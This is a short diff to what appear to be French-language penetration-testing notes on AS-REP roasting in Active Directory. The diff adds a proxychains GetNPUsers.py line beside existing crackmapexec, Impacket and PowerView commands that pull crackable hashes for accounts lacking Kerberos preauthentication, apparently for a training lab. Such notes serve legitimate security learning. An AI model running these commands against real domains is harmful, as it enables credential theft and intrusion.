@@ -12,6 +12,7 @@ Après obtention de cette liste, on pourra tenter de casser les mots de passe de
 crackmapexec ldap  $TARGET -u "$AD_USER" -p "$AD_PASSWORD" --asreproast asrep.txt
 
 GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
+proxychains -q GetNPUsers.py -hashes "$PASSWORD" -dc-ip "$DC" "$DOMAIN/$USER" -debug
 
 # Powerview
 Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
